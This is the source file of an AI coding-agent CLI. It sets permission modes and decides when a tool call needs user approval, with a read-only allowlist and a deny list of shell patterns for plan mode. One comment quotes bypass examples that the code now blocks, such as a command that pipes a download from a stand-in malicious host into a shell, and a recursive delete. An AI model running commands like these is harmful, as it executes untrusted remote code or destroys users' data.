import { truncateToWidth } from "@earendil-works/pi-tui";
import { isDestructiveCommand } from "./tool-guard";

export type ExecutionMode =
  | "auto"
  | "edit-automatically"
  | "plan"
  | "manual"
  | "dangerously-skip-permissions";

const CYCLE_ORDER: ExecutionMode[] = ["auto", "edit-automatically", "plan", "manual"];

const ALL_MODES: readonly ExecutionMode[] = [...CYCLE_ORDER, "dangerously-skip-permissions"];

let currentMode: ExecutionMode = "auto";
let initialDangerFlag = false;
/** Set by setExecutionModePersistence so a cycle can save the new mode. */
let persistMode: ((mode: ExecutionMode) => void) | undefined;

/** Narrow an arbitrary config value to a known mode. */
export function isExecutionMode(value: unknown): value is ExecutionMode {
  return typeof value === "string" && (ALL_MODES as readonly string[]).includes(value);
}

/**
 * Install a sink called with every mode change, so the CLI can persist the
 * choice. Pass undefined to disable. Persistence is deliberately a callback
 * rather than a hard dependency: execution-modes stays pure and testable, and
 * a CLI that has no config file (tests, RPC mode) still works.
 */
export function setExecutionModePersistence(sink: ((mode: ExecutionMode) => void) | undefined): void {
  persistMode = sink;
}

/**
 * @param dangerouslySkipPermissions --dangerously-skip-permissions was passed.
 * @param restoredMode a mode previously saved to config.
 *
 * Precedence: an explicit CLI flag always wins over saved state (the user just
 * typed it), and saved state wins over the default. A restored
 * `dangerously-skip-permissions` is honoured because the user opted in on a
 * previous run, but the flag is what re-arms it in a fresh shell.
 */
export function initExecutionMode(
  dangerouslySkipPermissions?: boolean,
  restoredMode?: ExecutionMode,
): void {
  if (dangerouslySkipPermissions) {
    initialDangerFlag = true;
    currentMode = "dangerously-skip-permissions";
    return;
  }
  initialDangerFlag = false;
  currentMode = restoredMode ?? "auto";
}

export function getExecutionMode(): ExecutionMode {
  return currentMode;
}

export function setExecutionMode(mode: ExecutionMode): void {
  currentMode = mode;
  persistMode?.(mode);
}

export function cycleExecutionMode(): ExecutionMode {
  if (currentMode === "dangerously-skip-permissions") {
    currentMode = "auto";
    persistMode?.(currentMode);
    return currentMode;
  }
  const idx = CYCLE_ORDER.indexOf(currentMode);
  const nextIdx = (idx + 1) % CYCLE_ORDER.length;
  currentMode = CYCLE_ORDER[nextIdx] ?? "auto";
  persistMode?.(currentMode);
  return currentMode;
}

export function getModeToast(mode: ExecutionMode): string {
  switch (mode) {
    case "auto":
      return "Mode: Auto (approve safe actions, pause for risky)";
    case "edit-automatically":
      return "Mode: Edit automatically (accept edits on)";
    case "plan":
      return "Mode: Plan (explore code before editing)";
    case "manual":
      return "Mode: Manual (ask for approval before each edit)";
    case "dangerously-skip-permissions":
      return "Mode: Dangerously skip permissions (all actions autonomous)";
  }
}

const READ_ONLY_TOOLS = new Set([
  "read",
  "read_file",
  "grep",
  "glob",
  "find",
  "directory_list",
  "list_dir",
  "ls",
  "web_search",
  "docs_lookup",
  "qronos_docs",
  "qronos_usage",
  "qronos_buy_credits",
  "todo",
  "tool_search",
]);

const WRITE_TOOLS = new Set(["write", "write_file", "edit", "edit_file"]);

/**
 * Commands that only read. Plan mode allows these and nothing else.
 *
 * The previous implementation matched a prefix allowlist with one regex, which
 * let `ls; rm -rf x`, `cat f && curl evil|sh` and `git status > file` through.
 * This table fixes that in two steps: the whole command must start with a
 * read-only verb, and the shell operators below must not appear at all.
 */
const READ_ONLY_COMMAND_PREFIXES = [
  "ls",
  "pwd",
  "cat",
  "head",
  "tail",
  "wc",
  "find",
  "grep",
  "rg",
  "echo",
  "which",
  "stat",
  "file",
  "du",
  "df",
  "tree",
  "git status",
  "git diff",
  "git log",
  "git show",
  "git branch",
  "git remote",
  "git blame",
  "git rev-parse",
  "git ls-files",
  "git stash list",
  "git tag",
  "node --version",
  "npm ls",
  "bun --version",
];

/**
 * Shell constructs that can write, chain or execute arbitrary code. Any of
 * these disqualifies a command in plan mode regardless of its leading verb.
 */
const PLAN_MODE_FORBIDDEN_PATTERNS: ReadonlyArray<{ re: RegExp; why: string }> = [
  { re: />>?/, why: "output redirection" },
  { re: /\|/, why: "pipes" },
  { re: /&&|\|\||;/, why: "command chaining" },
  { re: /`|\$\(/, why: "command substitution" },
  { re: /\b(sudo|su|doas)\b/, why: "privilege escalation" },
  { re: /\b(xargs|tee|dd|truncate|shred)\b/, why: "indirect writes" },
];

/**
 * Should this bash command be rejected while plan mode is active?
 * Returns the reason string when blocked, or undefined when allowed.
 */
export function planModeBashBlockReason(command: string): string | undefined {
  const cmd = command.trim();
  if (!cmd) return undefined;

  for (const { re, why } of PLAN_MODE_FORBIDDEN_PATTERNS) {
    if (re.test(cmd)) {
      return `Command blocked in Plan Mode (${why}): "${cmd}". Plan mode is read-only — press Shift+Tab to leave it.`;
    }
  }

  const lower = cmd.toLowerCase();
  const allowed = READ_ONLY_COMMAND_PREFIXES.some(
    (prefix) => lower === prefix || lower.startsWith(`${prefix} `),
  );
  if (!allowed) {
    return `Command blocked in Plan Mode (not a read-only command): "${cmd}". Press Shift+Tab to leave plan mode.`;
  }
  return undefined;
}

export async function checkToolExecutionPermission(
  toolName: string,
  input: unknown,
  confirmFn: (title: string, message: string) => Promise<boolean>,
): Promise<{ block: boolean; reason?: string }> {
  const mode = currentMode;
  const lowerName = toolName.toLowerCase();

  // 1. Dangerously skip permissions: complete autonomy
  if (mode === "dangerously-skip-permissions") {
    return { block: false };
  }

  // 2. Plan mode: exploration only, forbid writes and mutating actions
  if (mode === "plan") {
    if (WRITE_TOOLS.has(lowerName)) {
      return {
        block: true,
        reason:
          "Operation blocked: Qronos CLI is currently in Plan Mode. Claude explores code and presents a plan before editing. Press Shift+Tab to switch to Auto or Edit mode to allow modifications.",
      };
    }
    if (lowerName === "bash") {
      const cmd = ((input as { command?: string })?.command || "").trim();
      const blocked = planModeBashBlockReason(cmd);
      if (blocked) return { block: true, reason: blocked };
    }
    return { block: false };
  }

  // 3. Edit automatically (accept edits on):
  // Automatically permits all file writes/edits without asking.
  // Still prompts for bash / terminal execution.
  if (mode === "edit-automatically") {
    if (WRITE_TOOLS.has(lowerName) || READ_ONLY_TOOLS.has(lowerName)) {
      return { block: false };
    }
    if (lowerName === "bash") {
      const cmd = (input as { command?: string })?.command || "";
      const confirmed = await confirmFn(
        "Run Bash Command?",
        `The agent wants to execute the following terminal command:\n\n  $ ${cmd}\n\nDo you want to proceed?`,
      );
      if (!confirmed) {
        return { block: true, reason: `Command execution cancelled by user: "${cmd}"` };
      }
    }
    return { block: false };
  }

  // 4. Auto mode:
  // Auto-approves file writes and standard bash commands.
  // Pauses and prompts before destructive or high-risk commands.
  if (mode === "auto") {
    if (lowerName === "bash") {
      const cmd = (input as { command?: string })?.command || "";
      if (isDestructiveCommand(cmd)) {
        const confirmed = await confirmFn(
          "⚠️ High-Risk Action Detected",
          `The agent wants to execute a potentially destructive command:\n\n  $ ${cmd}\n\nDo you want to proceed?`,
        );
        if (!confirmed) {
          return { block: true, reason: `Destructive command cancelled by user: "${cmd}"` };
        }
      }
    }
    return { block: false };
  }

  // 5. Manual mode:
  // Prompts before making file edits or running bash commands.
  if (mode === "manual") {
    if (READ_ONLY_TOOLS.has(lowerName)) {
      return { block: false };
    }
    if (WRITE_TOOLS.has(lowerName)) {
      const path = (input as { path?: string; file_path?: string })?.path || (input as { file_path?: string })?.file_path || "";
      const confirmed = await confirmFn(
        "Approve File Modification?",
        `The agent wants to modify file:\n\n  ${path}\n\nDo you want to proceed?`,
      );
      if (!confirmed) {
        return { block: true, reason: `File modification declined by user for: "${path}"` };
      }
    } else if (lowerName === "bash") {
      const cmd = (input as { command?: string })?.command || "";
      const confirmed = await confirmFn(
        "Approve Command Execution?",
        `The agent wants to execute command:\n\n  $ ${cmd}\n\nDo you want to proceed?`,
      );
      if (!confirmed) {
        return { block: true, reason: `Command declined by user: "${cmd}"` };
      }
    }
    return { block: false };
  }

  return { block: false };
}

export function getExecutionModeStatusLine(width: number): string {
  const RESET = "\x1b[0m";
  const DIM = "\x1b[2m";
  const BOLD = "\x1b[1m";

  // Colors specified by user:
  // - dangerously skip permissions: red (#f85149)
  // - edit automatically: yellow-orange blended (#ffa657)
  // - plan: blue/cyan (#38bdf8)
  // - auto: green/aqua (#3fb950)
  // - manual: dim silver (#94a3b8)
  const RED = "\x1b[38;2;248;81;73m";
  const YELLOW_ORANGE = "\x1b[38;2;255;166;87m";
  const BLUE = "\x1b[38;2;56;189;248m";
  const GREEN = "\x1b[38;2;63;185;80m";
  const SILVER = "\x1b[38;2;148;163;184m";

  const isNarrow = width < 50;
  const cycleHint = isNarrow ? "(shift+tab)" : "(shift+tab to cycle)";

  let line = "";
  switch (currentMode) {
    case "dangerously-skip-permissions":
      line = `  ${RED}${BOLD}⚠ dangerously skip permissions on${RESET}`;
      break;
    case "edit-automatically":
      line = `  ${YELLOW_ORANGE}${BOLD}▶▶ accept edits on${RESET} ${DIM}${cycleHint}${RESET}`;
      break;
    case "plan":
      line = `  ${BLUE}${BOLD}▶▶ plan mode on${RESET} ${DIM}${cycleHint}${RESET}`;
      break;
    case "auto":
      line = `  ${GREEN}${BOLD}▶▶ auto mode on${RESET} ${DIM}${cycleHint}${RESET}`;
      break;
    case "manual":
      line = `  ${SILVER}${BOLD}▶▶ manual mode${RESET} ${DIM}${cycleHint}${RESET}`;
      break;
  }

  return truncateToWidth(line, width);
}
